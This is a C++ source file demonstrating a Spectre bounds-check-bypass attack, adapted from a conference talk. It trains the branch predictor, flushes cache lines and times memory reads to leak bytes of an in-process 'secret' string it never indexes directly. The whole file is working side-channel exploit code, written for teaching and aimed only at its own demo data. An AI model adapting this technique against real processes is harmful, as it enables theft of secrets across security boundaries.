/*
 * spectre.cpp
 *      Demo of spectre attack
 *
 * code taken from cppcon 2018 chandler carruty spectre talk
 */

#include <algorithm>
#include <numeric>
#include <array>
#include <iostream>
#include <cstring>
#include <string_view>
#include <tuple>
#include <x86intrin.h>

static constexpr std::string_view text_table[] = {
    "Hello World!",
    "Hello GitHub",
    "This is my secret!"
};

static void force_read(uint8_t *p) {
    asm volatile("" : : "r"(*p) : "memory");
}

static int64_t read_tsc() {
    unsigned int junk;
    return __rdtscp(&junk);
}

template <typename RangeT>
static std::pair<int, int> top_two_indices(const RangeT &range) {
    int j{0}, k{0};
    for(unsigned int i{0}; i < range.size(); i++) {
        if(range[i] > range[j]) {
            k = j;
            j = i;
        } else if(range[i] > range[k]) {
            k = i;
        }
    }
    return {j, k};
}

/* 
 * Use spectre to leak text[idx], even though idx is out of range
 * and the accesses to text[] are always checked to be in range.
 * In a real attack the attacker would be flushing cache and measuring while
 * the victim is doing the in-bounds and occasionally out of bounds data-dependent read. 
 * In this demo they are done together in the ideal order for the attacker.
 */
char leak_byte(std::string_view text, int idx) {
    constexpr auto stride = 512;
    static uint8_t timing_array[256 * stride];
    memset(timing_array, 1, sizeof timing_array);

    const char *data = text.begin();
    int *size_in_heap = new int(text.size()); // contrived to make access slow

    std::array<int64_t, 256> latencies{};
    std::array<int, 256> scores{};
    int best_val{0}, runner_up_val{0};

    for(int run{0}; run < 1000; run++) {
        // flush all of timing array
        for(int i{0}; i < 256; i++) {
            _mm_clflush(&timing_array[i * stride]);
        }

        int safe_idx = run % text.size(); // always inbound for the string view passed in!

        for(int i{0}; i < 500; i++) {
            _mm_clflush(size_in_heap);

            // original had a delay here, but it doesnt seem to be necessary on my system
            //for(volatile int z = 0; z < 1000; z++) { /* delay! */ }

            /* 
             * This is a data-dependent read, but because of bounds checking
             * it doesnt (normally) leak the secret. However, speculative execution
             * can make the body of the "if" execute and cause cache effects even
             * when the condition is false! hence it can leak the secret.
             * The local_index is usually safe to train the predictor that the if statement
             * is usually true.
             */
            int local_index = ((i + 1) % 10) ? safe_idx : idx;
            if(local_index < *size_in_heap) {
                force_read(&timing_array[data[local_index] * stride]);
            }
        }

        // now measure read latencies to see if we can detect what data[idx] was
        for(int i{0}; i < 256; i++) {
            int mixed_i = ((i * 167) + 13) & 0xff; // ???, I guess so we test in pseudo-random order?
            uint8_t *timing_entry = &timing_array[mixed_i * stride];
            int64_t start = read_tsc();
            force_read(timing_entry);
            latencies[mixed_i] = read_tsc() - start;
        }

        // score anything that stands out
        int64_t avg_latency = std::accumulate(latencies.begin(), latencies.end(), 0) / 256;
        for(int i{0}; i < 256; i++) {
            if(latencies[i] < (avg_latency * 3 / 4) && i != data[safe_idx]) {
                scores[i]++;
            }
        }

        // see if any score is significantly better than the rest
        std::tie(best_val, runner_up_val) = top_two_indices(scores);
        if(scores[best_val] > (2 * scores[runner_up_val] + 400)) {
            break;
        }
    }

    return char(best_val);
}

int main(int argc, char **argv) {
    for(long i{text_table[2].begin() - text_table[1].begin()}; 
        i < (text_table[2].end() - text_table[1].begin()); i++) {
        char ch{leak_byte(text_table[1], i)}; // never indexes the secret 3rd string!
        std::cout << "got: " << ch << std::endl;
    }
    return 0;
}
